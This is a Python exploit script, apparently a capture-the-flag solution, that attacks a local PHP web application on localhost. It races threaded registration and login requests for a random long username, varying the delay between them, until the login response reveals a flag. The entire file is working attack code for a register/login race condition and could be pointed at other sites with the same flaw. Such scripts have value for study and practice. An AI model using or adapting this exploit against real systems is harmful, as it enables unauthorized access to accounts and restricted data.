from pwn import *
import threading
import requests
import time
import random
import string

REGISTER_URL = "http://localhost:15051/register.php"
LOGIN_URL    = "http://localhost:15052/login.php"

def generate_username(length=128):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

password = "asdfasdfasdf"
login_success = False

def register(username):
    data = {
        'username': username,
        'password': password
    }
    requests.post(REGISTER_URL, data=data)

def login(username):
    global login_success
    data = {
        'username': username,
        'password': password
    }
    r = requests.post(LOGIN_URL, data=data)
    if "flag" in r.text or "/proc/flag" in r.text:
        print("[+] flag")
        print(r.text)
        login_success = True
    elif "Logged in as" in r.text:
        print("[*] restricted")
    else:
        print("[-] failed")
    # print(r.text)

def exploit(delay):
    username = generate_username()
    reg_thread = threading.Thread(target=register, args=(username,))
    log_thread = threading.Thread(target=login, args=(username,))

    reg_thread.start()
    time.sleep(delay)
    log_thread.start()

    log_thread.join()
    reg_thread.join()

if __name__ == "__main__":
    context.log_level = 'info'
    while True:
        for attempt in range(5):
            exploit(0.000001*attempt)
            if login_success:
                break
            time.sleep(0.1)
        if login_success:
            break